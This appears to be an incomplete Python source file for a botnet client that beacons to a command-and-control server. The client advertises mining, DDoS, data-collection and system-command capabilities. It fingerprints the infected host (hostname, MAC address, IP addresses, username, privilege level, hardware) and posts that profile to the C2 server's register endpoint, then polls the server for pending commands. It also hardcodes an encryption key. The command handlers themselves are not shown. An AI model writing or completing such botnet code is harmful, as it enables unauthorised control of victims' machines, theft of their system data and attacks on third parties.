import requests
import json
import time
import socket
import platform
import psutil
import uuid
import threading
import hashlib
import random
import subprocess
import os 

from cryptography.fernet import Fernet

class PythonBot: 
    def __init__(self, c2_server, port=8000):
        self.c2_server = c2_server
        self.port = port 
        self.base_url = f'http://{c2_server}:{port}/api'
        self.running = True
        self.capabilities = { 
            'mining': True,
            'ddos': True,
            'seo': True,
            'data_collection': True,
            'system_comands': True
        }
        self.session = requests.Session()
        self.bot_id = self.generate_bot_id()
        
        #Encryption
        self.encryption_key = b'IptksQT0gmh5RL3CJHLQ6fKsAOv91KR637WA8QJjoDo='
        self.fernet = Fernet(self.encryption_key)

    def generate_bot_id(self):
        hostname = socket.gethostname()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 8*6, 8)[::-1]])
        print('hostname:', hostname, 'mac :', mac)
        return f'pybot-{hostname}-{mac}'

    def get_system_info(self):
        try :
            system_info = {
                'bot_type': 'python',
                'bot_id': self.bot_id,
                'host_name': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'platform': platform.system().lower(),
                'architecture': platform.architecture()[0],
                'username': psutil.users()[0].name if psutil.users() else 'Unknown',
                'priveleges': 'admin' if os.name == 'nt' else 'root' if os.geteuid() == 0 else 'user',
                'version': '1.0.0',
                'cpu_cores': psutil.cpu_count(),
                'memeory_size': psutil.virtual_memory().total,
                'disk_space': psutil.disk_usage('/').total,
                'internal_ip': self.get_internal_ip(),
                'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 8*6, 8)][::-1]),
                'metadata': {
                    'boot_time': psutil.boot_time(),
                    'process_count': len(psutil.pids()),
                    'python_version': platform.python_version()
                },
                'capabilities': self.capabilities

            }
            print(system_info)
            return system_info
        except Exception as e:
            print(f'Error collecting system info: ', e)
            return {}
        
    def get_internal_ip(self): 
        try: 
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return  '127.0.0.1'
    def register_with_c2(self):
        seystem_info = self.get_system_info()
        try:
            response = self.session.post(
                f'{self.base_url}/bots/register/',
                json=seystem_info,
                timeout=10
            )
            if response.status_code == 200:
                print("Successfully registered with c2 server")
                return True
        except Exception as e:
            print(f"Registration failed : {e}")
        return False
    
    def check_for_commands(self):
        try:
            response = self.session.get(
                f'{self.base_url}/commands/pending/?bot_id={self.bot_id}',
                timeout=10
            )
            if response.status_code == 200:
                commands = response.json()
                return commands
        except Exception as e:
            print(f"Error checking commands: {e}")
        return []

if __name__ == '__main__':
    bot = PythonBot('kenya')
    bot.generate_bot_id()
    bot.get_system_info()